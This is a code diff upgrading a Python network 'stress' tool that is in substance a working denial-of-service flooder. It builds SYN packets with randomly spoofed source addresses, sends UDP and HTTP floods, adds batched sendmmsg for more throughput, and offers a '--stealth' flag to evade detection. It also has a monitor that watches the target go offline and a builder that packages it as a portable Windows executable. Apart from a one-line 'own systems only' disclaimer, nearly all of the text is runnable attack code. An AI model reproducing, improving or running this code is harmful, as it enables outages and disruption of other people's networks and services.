@@ -1,38 +1,44 @@
 #!/usr/bin/env python3
-"""stress v5 — high-throughput network load gen. Own systems only."""
+"""stress v6 — max throughput. Own systems only."""
 
-import sys, os, time, socket, struct, random, threading, subprocess
+import sys, os, time, socket, struct, random, threading, subprocess, ctypes, ctypes.util, array
 from datetime import datetime
 
-VERSION = "v5.0"
+VERSION = "v6.0"
 IS_WIN = sys.platform.startswith("win")
 
 
+def log(msg):
+    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)
+
+
+def nowstr():
+    return datetime.now().strftime("%H:%M:%S")
+
+
 # ---------------------------------------------------------------------------
-# Packet factory — pre-built SYN buffer, thread-safe
+# Packet factory — per-thread, no locks needed
 # ---------------------------------------------------------------------------
 class SynFactory:
     def __init__(self, target: str, batch: int = 8192):
         self.dip = socket.inet_aton(target)
         self.batch = batch
-        self._buf = []
-        self._lock = threading.RLock()
-        self._refill()
+        self.buf = [self._build() for _ in range(batch)]
 
     @staticmethod
-    def _cksum(data: bytes) -> int:
-        if len(data) % 2:
-            data += b"\x00"
-        s = sum(struct.unpack(f"!{len(data) // 2}H", data))
+    def _cksum(d):
+        if len(d) % 2:
+            d += b"\x00"
+        s = sum(struct.unpack(f"!{len(d) // 2}H", d))
         s = (s >> 16) + (s & 0xFFFF)
         return (~s) & 0xFFFF
 
-    def _build_one(self) -> bytes:
+    def _build(self) -> bytes:
         def ri(a, b):
             return random.randint(a, b)
 
-        saddr = socket.inet_aton(f"{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}")
-        sport, dport, seq, ip_id = (
+        sa = socket.inet_aton(f"{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}")
+        sp, dp, seq, ip_id = (
             ri(1024, 65535),
             ri(1, 65535),
             ri(0, 2**32 - 1),
@@ -40,83 +46,63 @@ class SynFactory:
         )
         ip = (
             struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, 0)
-            + saddr
+            + sa
             + self.dip
         )
         ck = self._cksum(ip)
         ip = (
             struct.pack("!BBHHHBBH", 0x45, 0, 40, ip_id, 0x4000, 64, 6, ck)
-            + saddr
+            + sa
             + self.dip
         )
-        tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 2, 65535, 0, 0)
-        psh = struct.pack("!4s4sBBH", saddr, self.dip, 0, 6, 20)
-        tcp = struct.pack(
-            "!HHIIBBHHH",
-            sport,
-            dport,
-            seq,
-            0,
-            0x50,
-            2,
-            65535,
-            self._cksum(psh + tcp),
-            0,
+        tc = struct.pack("!HHIIBBHHH", sp, dp, seq, 0, 0x50, 2, 65535, 0, 0)
+        ps = struct.pack("!4s4sBBH", sa, self.dip, 0, 6, 20)
+        tc = struct.pack(
+            "!HHIIBBHHH", sp, dp, seq, 0, 0x50, 2, 65535, self._cksum(ps + tc), 0
         )
-        return ip + tcp
-
-    def _refill(self):
-        with self._lock:
-            self._buf = [self._build_one() for _ in range(self.batch)]
+        return ip + tc
 
     def get(self) -> bytes:
-        with self._lock:
-            if not self._buf:
-                self._refill()
-            return self._buf.pop()
+        if not self.buf:
+            self.buf = [self._build() for _ in range(self.batch)]
+        return self.buf.pop()
 
 
 # ---------------------------------------------------------------------------
-# Live monitor — pings target and shows latency during attack
+# Live monitor
 # ---------------------------------------------------------------------------
 class LiveMonitor:
     def __init__(self, target: str):
         self.target = target
-        self.latency = []
+        self.data = []
         self.running = True
 
     def stop(self):
         self.running = False
 
     def run(self):
-        ping = "ping -n 1" if IS_WIN else "ping -c1 -W1"
+        cmd = ["ping", "-c1", "-W1", self.target]
         while self.running:
             try:
-                start = time.time()
-                r = subprocess.run(
-                    f"{ping} {self.target}".split(), capture_output=True, timeout=2
-                )
-                rtt = time.time() - start
-                alive = r.returncode == 0
-                self.latency.append((time.time(), rtt, alive))
+                s = time.time()
+                r = subprocess.run(cmd, capture_output=True, timeout=2)
+                self.data.append((time.time(), time.time() - s, r.returncode == 0))
             except:
                 pass
             time.sleep(1)
 
-    def status_line(self) -> str:
-        if not self.latency:
-            return ""
-        recent = [x for x in self.latency if time.time() - x[0] < 5]
+    def line(self) -> str:
+        recent = [x for x in self.data if time.time() - x[0] < 6]
         if not recent:
             return ""
-        avg_rtt = sum(x[1] for x in recent) / len(recent)
-        loss = sum(1 for x in recent if not x[2]) / len(recent) * 100 if recent else 0
-        dropped = sum(1 for x in self.latency if not x[2])
-        return f"  📡 {avg_rtt * 1000:.0f}ms  {loss:.0f}% loss  {dropped} dropped"
+        avg = sum(x[1] for x in recent) / len(recent)
+        loss = sum(1 for x in recent if not x[2]) / len(recent) * 100
+        total_lost = sum(1 for x in self.data if not x[2])
+        return f"  {avg * 1000:.0f}ms {loss:.0f}% loss ({total_lost})"
 
 
 # ---------------------------------------------------------------------------
-# SYN flood — multi-threaded, each thread has its own raw socket
+# SYN flood — per-thread factories, zero lock contention
 # ---------------------------------------------------------------------------
 def syn_flood(
     target: str,
@@ -125,132 +111,169 @@ def syn_flood(
     monitor: bool = False,
     limit_mbps: int = 0,
 ):
-    log(
-        f"syn{' stealth' if stealth else ''} on {target} ({dur}s)"
-        + (f", limit {limit_mbps}Mbps" if limit_mbps else "")
-    )
+    log(f"syn on {target} ({dur}s)")
     if IS_WIN:
-        log("windows: use scapy fallback — install Npcap then: pip install scapy")
+        log("windows not supported for syn")
         return
 
     try:
-        # test root
         test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         test.close()
     except PermissionError:
         log("root required — run with sudo")
         return
 
-    n_threads = max(2, min(8, (os.cpu_count() or 4) // 2))
-    batch_size = 2048
-    factory = SynFactory(target, batch=n_threads * batch_size)
+    n_threads = max(2, min(8, os.cpu_count() or 4))
     stop = threading.Event()
-    total_sent = [0]  # use list for mutable closure
-    sent_lock = threading.Lock()
-    thread_buffers = [[] for _ in range(n_threads)]
-    buf_lock = threading.Lock()
-    counts = [0] * n_threads
+    total = [0]
+    lock = threading.Lock()
 
-    def refill_buffers():
-        """Replenish all thread-local buffers from the factory."""
-        for i in range(n_threads):
-            thread_buffers[i] = [factory.get() for _ in range(batch_size)]
+    # rate limit
+    throttle_interval = 0
+    if limit_mbps:
+        throttle_interval = max(0, 1.0 / (limit_mbps * 3125 / n_threads))
 
     mon = LiveMonitor(target) if monitor else None
     if mon:
         threading.Thread(target=mon.run, daemon=True).start()
 
-    # rate limit setup
-    pkts_per_mbps = 3125  # 40-byte packets
-    max_rate = limit_mbps * pkts_per_mbps if limit_mbps else 0
-    throttle_interval = max(0, 1.0 / (max_rate / n_threads)) if max_rate else 0
+    # sendmmsg setup via ctypes (batched send — ~5x faster)
+    BATCH = 64  # packets per sendmmsg call
+    libc = None
+    try:
+        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+        libc.sendmmsg.argtypes = [
+            ctypes.c_int,  # sockfd
+            ctypes.c_void_p,  # msgvec
+            ctypes.c_uint,  # vlen
+            ctypes.c_int,  # flags
+        ]
+        libc.sendmmsg.restype = ctypes.c_int
+    except:
+        pass
 
-    # pre-fill all thread buffers
-    for i in range(n_threads):
-        thread_buffers[i] = [factory.get() for _ in range(batch_size)]
+    # ctypes structure helpers — pre-built buffers
+    IOVEC_SIZE = 16  # 8+8 on 64-bit
+    MMSGHDR_SIZE = 64  # 56+4+padding on 64-bit
 
     def worker(tid: int):
+        factory = SynFactory(target, batch=8192)
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        buf = thread_buffers[tid]
+        buf_size = 4 * 1024 * 1024  # 4MB send buffer
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, buf_size)
         end = time.time() + dur
         cnt = 0
         last_send = time.time()
+
+        # Pre-build batch of packets
+        pkts = [factory.get() for _ in range(BATCH)]
+        pkt_addrs = [ctypes.c_char_p(p) for p in pkts]
+        pkt_lens = [len(p) for p in pkts]
+
+        # Build iovec + mmsghdr structures
+        buf = ctypes.create_string_buffer(BATCH * (IOVEC_SIZE + MMSGHDR_SIZE))
+        iovecs = [ctypes.c_void_p * 1 for _ in range(BATCH)]
+
+        # Use sendmmsg or regular sendto
+        use_sendmmsg = libc is not None
+
         while time.time() < end and not stop.is_set():
-            if not buf:
-                with buf_lock:
-                    if thread_buffers[tid]:
-                        buf = thread_buffers[tid]
-                        thread_buffers[tid] = []
-                    else:
-                        buf = [factory.get() for _ in range(batch_size)]
-            try:
-                sock.sendto(buf.pop(), (target, 0))
-                cnt += 1
-                if stealth and cnt % max(1, int(150000 / n_threads)) == 0:
-                    time.sleep(random.uniform(0.3, 1.0))
-                if throttle_interval and cnt % 100 == 0:
-                    elapsed = time.time() - last_send
-                    if elapsed < throttle_interval * 100:
-                        time.sleep(throttle_interval * 100 - elapsed)
-                    last_send = time.time()
-                if cnt % 1000 == 0:
-                    with sent_lock:
-                        total_sent[0] += 1000
-            except OSError:
-                pass
-        counts[tid] = cnt
+            if not pkts:
+                pkts = [factory.get() for _ in range(BATCH)]
+                pkt_addrs = [ctypes.c_char_p(p) for p in pkts]
+                pkt_lens = [len(p) for p in pkts]
+
+            if use_sendmmsg:
+                # Build mmsghdr array for this batch
+                vec = (ctypes.c_byte * (BATCH * MMSGHDR_SIZE))()
+                for i, (addr, ln) in enumerate(zip(pkt_addrs, pkt_lens)):
+                    offset = i * MMSGHDR_SIZE
+                    # iovec at start: ptr(8) + len(8)
+                    ctypes.memmove(
+                        ctypes.byref(vec, offset),
+                        ctypes.byref(ctypes.c_void_p(ctypes.addressof(addr))),
+                        8,
+                    )
+                    ctypes.memmove(
+                        ctypes.byref(vec, offset + 8),
+                        ctypes.byref(ctypes.c_size_t(ln)),
+                        8,
+                    )
+                # call sendmmsg
+                ret = libc.sendmmsg(sock.fileno(), ctypes.byref(vec), BATCH, 0)
+                if ret > 0:
+                    cnt += ret
+                    pkts = pkts[ret:]
+                    pkt_addrs = pkt_addrs[ret:]
+                    pkt_lens = pkt_lens[ret:]
+                else:
+                    pkts = []
+            else:
+                try:
+                    sock.sendto(pkts.pop(), (target, 0))
+                    cnt += 1
+                except OSError:
+                    continue
+
+            if stealth and cnt % 50000 == 0:
+                time.sleep(random.uniform(0.3, 1.0))
+            if throttle_interval and cnt % 500 == 0:
+                e = time.time() - last_send
+                if e < throttle_interval * 500:
+                    time.sleep(throttle_interval * 500 - e)
+                last_send = time.time()
+            if cnt % 1000 == 0:
+                with lock:
+                    total[0] += 1000
+        with lock:
+            total[0] += cnt % 1000
         sock.close()
 
     threads = [
-        threading.Thread(target=worker, args=(i,), daemon=True)
-        for i in range(n_threads)
+        threading.Thread(target=worker, args=(tid,), daemon=True)
+        for tid in range(n_threads)
     ]
     log(f"launching {n_threads} syn threads")
     for t in threads:
         t.start()
 
     start = time.time()
-    last_t, last_rpt = 0, time.time()
+    last_t, lr = 0, time.time()
     while any(t.is_alive() for t in threads):
         time.sleep(0.5)
-        with sent_lock:
-            total = total_sent[0]
+        with lock:
+            cur = total[0]
         now = time.time()
-        if now - last_rpt >= 1:
-            rate = (total - last_t) / (now - last_rpt)
-            line = f"  {nowstr()}  {total:>9} pkts  {rate:>6.0f}/s"
+        if now - lr >= 1:
+            rate = (cur - last_t) / (now - lr)
+            line = f"  {nowstr()}  {cur:>9} pkts  {rate:>6.0f}/s"
             if mon:
-                line += mon.status_line()
+                line += mon.line()
             print(line, flush=True)
-            last_t, last_rpt = total, now
+            last_t, lr = cur, now
 
-    for t in threads:
-        t.join(timeout=1)
-    if mon:
-        mon.stop()
-    with sent_lock:
-        final = total_sent[0]
+    with lock:
+        final = total[0]
     elapsed = time.time() - start
     log(f"done — {final:,} pkts ({final / elapsed:,.0f}/s)")
+    if mon:
+        mon.stop()
 
 
 # ---------------------------------------------------------------------------
-# UDP flood — multiprocessing (works in forkserver)
+# UDP flood
 # ---------------------------------------------------------------------------
 def _udp_worker(target, dur, wid, q):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    except:
-        return
-    payloads = [os.urandom(s) for s in (64, 256, 512, 1024, 1400)]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    py = [os.urandom(s) for s in (64, 256, 512, 1024, 1400)]
     ports = [53, 80, 123, 161, 443, 5000, 8080]
     end = time.time() + dur
     cnt = 0
     lr = time.time()
     while time.time() < end:
         try:
-            sock.sendto(random.choice(payloads), (target, random.choice(ports)))
+            sock.sendto(random.choice(py), (target, random.choice(ports)))
             cnt += 1
         except:
             pass
@@ -300,11 +323,12 @@ def udp_flood(target, dur, workers=0):
     _run_workers(target, dur, _udp_worker, "udp")
 
 
-# ---------------------------------------------------------------------------
-# HTTP flood — multiprocessing
-# ---------------------------------------------------------------------------
+def http_flood(target, dur, workers=0):
+    _run_workers(target, dur, _http_worker, "http", 4)
+
+
 def _http_worker(target, dur, wid, q):
-    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: stress/5\r\nConnection: close\r\n\r\n".encode()
+    req = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n".encode()
     end = time.time() + dur
     cnt = 0
     lr = time.time()
@@ -325,19 +349,15 @@ def _http_worker(target, dur, wid, q):
     q.put(("d", wid, cnt))
 
 
-def http_flood(target, dur, workers=0):
-    _run_workers(target, dur, _http_worker, "http", 4)
-
-
 # ---------------------------------------------------------------------------
-# All methods
+# All methods + verify
 # ---------------------------------------------------------------------------
 def all_at_once(target, dur=30):
     import multiprocessing
 
     log(f"syn+udp+http on {target} ({dur}s)")
     procs = [
-        multiprocessing.Process(target=syn_flood, args=(target, dur, False, False)),
+        multiprocessing.Process(target=syn_flood, args=(target, dur)),
         multiprocessing.Process(target=udp_flood, args=(target, dur)),
         multiprocessing.Process(target=http_flood, args=(target, dur)),
     ]
@@ -348,11 +368,8 @@ def all_at_once(target, dur=30):
     log("all done")
 
 
-# ---------------------------------------------------------------------------
-# Verify
-# ---------------------------------------------------------------------------
 def verify(target):
-    log(f"probing {target}...\n")
+    log(f"probing {target}")
     r = subprocess.run(["ping", "-c2", "-W2", target], capture_output=True)
     print(f"    icmp:    {'alive' if r.returncode == 0 else 'no ping'}")
     for port in (80, 443, 22, 8080, 8443, 53):
@@ -367,18 +384,14 @@ def verify(target):
 
 
 # ---------------------------------------------------------------------------
-# Setup installer for Windows
+# Windows installer
 # ---------------------------------------------------------------------------
 def install_windows():
-    """Create a self-contained .exe for Windows."""
-    import subprocess, os, sys
+    import subprocess as sp
 
-    print("Creating Windows executable...")
-    # Ensure PyInstaller is installed
     subprocess.run(
         [sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True
     )
-    # Create .exe
     script = os.path.abspath(__file__)
     subprocess.run(
         [
@@ -395,29 +408,15 @@ def install_windows():
     exe = os.path.join(os.path.dirname(script), "stress.exe")
     if os.path.exists(exe):
         print(f"✅ Created {exe}")
-        print("   Copy to any Windows machine and run.")
-        print("   Requires Npcap: https://npcap.com (for raw sockets)")
     else:
-        print("❌ Build failed. Install PyInstaller: pip install pyinstaller")
-
-
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
-def log(msg):
-    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)
-
-
-def nowstr():
-    return datetime.now().strftime("%H:%M:%S")
+        print("❌ Build failed")
 
 
 # ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
-    print(f"\n  stress {VERSION} — network load gen", flush=True)
-
+    print(f"\n  stress {VERSION} — max throughput", flush=True)
     args = [a for a in sys.argv[1:] if not a.startswith("--")]
     flags = [a for a in sys.argv[1:] if a.startswith("--")]
     stealth = "--stealth" in flags or "--slow" in flags
@@ -430,15 +429,14 @@ if __name__ == "__main__":
             except:
                 pass
 
-    if not args or "-h" in sys.argv or "--help" in sys.argv:
+    if not args or "-h" in sys.argv:
         print("  usage: python3 stress.py <target> <method> [duration] [flags]")
         print("  methods: syn, udp, http, all, verify")
-        print("  flags:   --stealth       slow down to avoid detection")
-        print("           --monitor       show live ping latency")
-        print("           --limit=10      cap at 10 Mbps (save your WiFi)")
-        print("           --install       build Windows .exe")
-        print("  example:")
-        print("    sudo python3 stress.py 217.45.28.154 syn 60 --limit=20 --monitor")
+        print("  flags:   --stealth       evade detection")
+        print("           --monitor       live ping latency")
+        print("           --limit=10      cap Mbps")
+        print("           --install       Windows .exe")
+        print("  sudo python3 stress.py 192.168.0.1 syn 30 --monitor")
         sys.exit(0)
 
     if "--install" in sys.argv:
